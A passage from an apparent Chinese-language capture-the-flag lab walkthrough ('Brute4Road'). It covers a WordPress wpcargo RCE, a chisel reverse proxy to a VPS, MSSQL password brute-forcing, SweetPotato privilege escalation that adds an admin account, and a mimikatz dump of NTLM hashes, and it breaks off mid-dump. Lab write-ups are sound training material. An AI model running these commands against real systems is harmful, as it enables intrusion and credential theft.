punctuation">[</span>ADMIN$ C$ fileshare IPC$<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">23</span>:43:24<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> SMB认证成功 <span class="token number">172.22</span>.2.16:445 admin:123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传 chisel 做代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel client vpsip:33322 R:0.0.0.0:44543:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="Wordpress-wpcargo-漏洞"><a href="#Wordpress-wpcargo-漏洞" class="headerlink" title="Wordpress wpcargo 漏洞"></a>Wordpress wpcargo 漏洞</h1><p>先看 wordpress 站点，wpscan 扫一下，貌似由于 vps 是国内的导致用不了 api-token，那先扫一下插件吧</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> wpscan <span class="token parameter variable">--url</span> http://172.22.2.18/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Interesting Finding<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Headers <span class="token operator">|</span> Interesting Entry: Server: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> <span class="token operator">|</span> Found By: Headers <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%<span class="token punctuation">[</span>+<span class="token punctuation">]</span> XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>% <span class="token operator">|</span> References: <span class="token operator">|</span>  - http://codex.wordpress.org/XML-RPC_Pingback_API <span class="token operator">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ <span class="token operator">|</span>  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ <span class="token operator">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ <span class="token operator">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress readme found: http://172.22.2.18/readme.html <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/ <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">100</span>%<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confidence: <span class="token number">60</span>% <span class="token operator">|</span> References: <span class="token operator">|</span>  - https://www.iplocation.net/defend-wordpress-from-ddos <span class="token operator">|</span>  - https://github.com/wpscanteam/wpscan/issues/1299<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress version <span class="token number">6.0</span> identified <span class="token punctuation">(</span>Insecure, released on <span class="token number">2022</span>-05-24<span class="token punctuation">)</span>. <span class="token operator">|</span> Found By: Rss Generator <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>  - http://172.22.2.18/index.php/feed/, <span class="token operator">&lt;</span>generator<span class="token operator">></span>https://wordpress.org/?v<span class="token operator">=</span><span class="token number">6</span>.<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/generator<span class="token operator">></span> <span class="token operator">|</span>  - http://172.22.2.18/index.php/comments/feed/, <span class="token operator">&lt;</span>generator<span class="token operator">></span>https://wordpress.org/?v<span class="token operator">=</span><span class="token number">6</span>.<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/generator<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress theme <span class="token keyword">in</span> use: twentytwentytwo <span class="token operator">|</span> Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/ <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-11-13T00:00:00.000Z <span class="token operator">|</span> Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> The version is out of date, the latest version is <span class="token number">1.9</span> <span class="token operator">|</span> Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver<span class="token operator">=</span><span class="token number">1.2</span> <span class="token operator">|</span> Style Name: Twenty Twenty-Two <span class="token operator">|</span> Style URI: https://wordpress.org/themes/twentytwentytwo/ <span class="token operator">|</span> Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a<span class="token punctuation">..</span>. <span class="token operator">|</span> Author: the WordPress team <span class="token operator">|</span> Author URI: https://wordpress.org/ <span class="token operator">|</span> <span class="token operator">|</span> Found By: Css Style In Homepage <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> Version: <span class="token number">1.2</span> <span class="token punctuation">(</span><span class="token number">80</span>% confidence<span class="token punctuation">)</span> <span class="token operator">|</span> Found By: Style <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver<span class="token operator">=</span><span class="token number">1.2</span>, Match: <span class="token string">'Version: 1.2'</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating All Plugins <span class="token punctuation">(</span>via Passive Methods<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking Plugin Versions <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> Plugin<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:<span class="token punctuation">[</span>+<span class="token punctuation">]</span> wpcargo <span class="token operator">|</span> Location: http://172.22.2.18/wp-content/plugins/wpcargo/ <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-08-08T17:00:00.000Z <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> The version is out of date, the latest version is <span class="token number">7.0</span>.6 <span class="token operator">|</span> <span class="token operator">|</span> Found By: Urls In Homepage <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> Version: <span class="token number">6</span>.x.x <span class="token punctuation">(</span><span class="token number">80</span>% confidence<span class="token punctuation">)</span> <span class="token operator">|</span> Found By: Readme - Stable Tag <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Config Backups <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span> Checking Config Backups - Time: 00:00:03 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">137</span> / <span class="token number">137</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:03<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No Config Backups Found.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先从插件入手寻找漏洞</p><p>wpcargo 插件存在未授权 RCE：</p><p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/</a></p><p><a href="https://github.com/biulove0x/CVE-2021-25003">https://github.com/biulove0x/CVE-2021-25003</a></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225010133773.png" alt="image-20250225010133773"></p><p>上去先做权限维持</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225010531327.png" alt="image-20250225010531327"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225010616088.png" alt="image-20250225010616088"></p><p>蚁剑代理完连上去，先看 wp-config.php</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225010817710.png" alt="image-20250225010817710"></p><p>得到数据库账密</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// ** Database settings - You can get this info from your web host ** //</span><span class="token comment">/** The name of the database for WordPress */</span><span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_NAME'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'wordpress'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** Database username */</span><span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'wpuser'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** Database password */</span><span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WpuserEha8Fgj9'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** Database hostname */</span><span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_HOST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'127.0.0.1'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="mysql-amp-mssql"><a href="#mysql-amp-mssql" class="headerlink" title="mysql &amp; mssql"></a>mysql &amp; mssql</h1><p>蚁剑自带的数据操作连上 mysqli</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225011443628.png" alt="image-20250225011443628"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225011203669.png" alt="image-20250225011203669"></p><p>查询的时候蚁剑莫名其妙抽风了</p><p>那用 MDUT，上传 HTTP 通道文件</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225012338378.png" alt="image-20250225012338378"></p><p>也连不上，看来用不了socks，那只能命令行执行了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uwpuser</span> -p<span class="token string">'WpuserEha8Fgj9'</span> <span class="token parameter variable">-e</span> <span class="token string">'use f1aagggghere;select * from flag02;'</span>mysql <span class="token parameter variable">-uwpuser</span> -p<span class="token string">'WpuserEha8Fgj9'</span> <span class="token parameter variable">-e</span> <span class="token string">'use f1aagggghere;select pAssw0rd from S0meth1ng_y0u_m1ght_1ntereSted;'</span> <span class="token operator">></span> <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225013749940.png" alt="image-20250225013749940"></p><p>flag02: <code>flag&#123;c757e423-eb44-459c-9c63-7625009910d8&#125;</code></p><p>S0meth1ng_y0u_m1ght_1ntereSted 是一个密码表</p><p>拿这个密码表用 fscan 爆破 172.22.2.16 的 mssql 服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.2.16 <span class="token parameter variable">-m</span> mssql <span class="token parameter variable">-pwdf</span> <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225015029271.png" alt="image-20250225015029271"></p><p>爆出密码<code>ElGNkOiC</code></p><p>那还是得用 MDUT 连上去，但是我懒得挂 http 代理了，于是有新项目支持socks5了：<a href="https://github.com/DeEpinGh0st/MDUT-Extend-Release">https://github.com/DeEpinGh0st/MDUT-Extend-Release</a></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225020003389.png" alt="image-20250225020003389"></p><p>那接下来要提权了</p><h1 id="SweetPotato提权-amp-RDP"><a href="#SweetPotato提权-amp-RDP" class="headerlink" title="SweetPotato提权 &amp; RDP"></a>SweetPotato提权 &amp; RDP</h1><p>开了那个 Ole 组件就能正常上传</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225020555029.png" alt="image-20250225020555029"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225020909996.png" alt="image-20250225020909996"></p><p><code>netstat -ano</code>发现3389开着，这里我们给自己创个用户然后 rdp 过去</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">C:<span class="token operator">/</span>Users/Public/sweetpotato<span class="token punctuation">.</span>exe <span class="token operator">-</span>a <span class="token string">"net user 0w0 qwer1234! /add"</span>C:<span class="token operator">/</span>Users/Public/sweetpotato<span class="token punctuation">.</span>exe <span class="token operator">-</span>a <span class="token string">"net localgroup administrators 0w0 /add"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获得第三个flag</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225021140276.png" alt="image-20250225021140276"></p><p>flag03: <code>flag&#123;5a85de41-3fe1-4d90-9b38-1c1100fad198&#125;</code></p><hr><h1 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h1><p>查看 systeminfo 发现我们在域环境里</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225021458510.png" alt="image-20250225021458510"></p><p>传一个猕猴桃上去，然后选择这个exe用管理员模式运行，可以抓域内用户密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225021645276.png" alt="image-20250225021645276"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">mimikatz <span class="token comment"># sekurlsa::logonpasswords</span>Authentication Id : 0 <span class="token punctuation">;</span> 25393932 <span class="token punctuation">(</span>00000000:01837b0c<span class="token punctuation">)</span>Session           : RemoteInteractive <span class="token keyword">from</span> 2User Name         : 0w0Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/25 2:10:54SID               : S-1-5-21-1403470932-1755135066-2609122076-1027        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : 0w0         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 6912928308e3cda903e6d75bd6091a20         <span class="token operator">*</span> SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de        tspkg :        wdigest :         <span class="token operator">*</span> Username : 0w0         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : 0w0         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 25393901 <span class="token punctuation">(</span>00000000:01837aed<span class="token punctuation">)</span>Session           : RemoteInteractive <span class="token keyword">from</span> 2User Name         : 0w0Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/25 2:10:54SID               : S-1-5-21-1403470932-1755135066-2609122076-1027        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : 0w0         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 6912928308e3cda903e6d75bd6091a20         <span class="token operator">*</span> SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de        tspkg :        wdigest :         <span class="token operator">*</span> Username : 0w0         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : 0w0         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 25360137 <span class="token punctuation">(</span>00000000:0182f709<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 2User Name         : DWM-2Domain            : Window ManagerLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/25 2:10:53SID               : S-1-5-90-0-2        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 209311 <span class="token punctuation">(</span>00000000:0003319f<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER19Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1022        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER19         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 9ce3bb5769303e1258f792792310e33b         <span class="token operator">*</span> SHA1     : 1a2452c461d89c45f199454f59771f17423e72f9        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER19         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER19         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 209102 <span class="token punctuation">(</span>00000000:000330ce<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER17Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1020        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER17         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 82fe575c8bb18d01df45eb54d0ebc3b4         <span class="token operator">*</span> SHA1     : 13b87dcba388982dcc44feeba232bb50aa29c7e9        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER17         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER17         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208851 <span class="token punctuation">(</span>00000000:00032fd3<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER15Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1018        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER15         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 6eeb34930fa71d82a464ce235261effd         <span class="token operator">*</span> SHA1     : 1dfc6d66d9cfdbaa5fc091fedde9a3387771d09b        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER15         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER15         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208687 <span class="token punctuation">(</span>00000000:00032f2f<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER13Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1016        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER13         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : b808e9a53247721e84cc314c870080c5         <span class="token operator">*</span> SHA1     : 47a42f4a6eed2b2d90f342416f42e2696052f546        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER13         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER13         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208604 <span class="token punctuation">(</span>00000000:00032edc<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER12Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1015        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER12         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 672702a4bd7524269b77dbb6b2e75911         <span class="token operator">*</span> SHA1     : c7a828609e4912ab752b43deda8351dc1a8ea240        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER12         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER12         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208522 <span class="token punctuation">(</span>00000000:00032e8a<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER11Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1014        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER11         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : cee10216b2126aa1a3f239b8201120ef         <span class="token operator">*</span> SHA1     : 4867093fc519f7d1e91d80e3790ef8a17a7fdd18        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER11         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER11         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208259 <span class="token punctuation">(</span>00000000:00032d83<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER08Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1011        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER08         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 465034ebde60dfae889c3e493e1816bf         <span class="token operator">*</span> SHA1     : c96428917f7c8a15ea0370716dee153842afaf02        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER08         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span 